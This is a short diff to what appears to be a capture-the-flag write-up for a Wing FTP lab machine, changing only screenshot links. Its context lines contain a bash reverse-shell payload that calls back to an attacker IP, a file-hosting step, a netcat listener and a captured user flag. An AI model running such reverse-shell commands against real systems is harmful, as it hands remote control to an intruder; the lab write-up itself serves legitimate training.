@@ -88,6 +88,7 @@ echo 'bash -i >& /dev/tcp/10.10.14.23/5555 0>&1' > /tmp/shell.sh
 python3 -m http.server 8080
 ```
 <img width="1107" height="111" alt="Screenshot 2026-05-19 202709" src="https://github.com/user-attachments/assets/5beabfde-98aa-490d-a6b2-1ab90dbb10ad" />
+<img width="998" height="76" alt="Screenshot 2026-05-19 202725" src="https://github.com/user-attachments/assets/e7d6e916-213f-40a3-beaf-752bf6f474d8" />
 
 ### Executing the Exploit
 A netcat listener was set up on port 5555, and the Python PoC script was executed to trigger the download and execution of the hosted payload scrip
@@ -123,7 +124,8 @@ wingftp@wingdata:/$ cat /home/ubuntu/user.txt
 966b96fc8bc54bfcb8be1b54b1f41bdf
 ```
 
-<img width="619" height="168" alt="Screenshot 2026-05-19 211832" src="https://github.com/user-attachments/assets/379a08ba-20ee-4b0a-aa5c-329b41fe18d0" />
+<img width="998" height="76" alt="Screenshot 2026-05-19 202725" src="https://github.com/user-attachments/assets/5e1871dd-47ff-4cb6-ba9e-def2229ff666" />
+
 
 
 
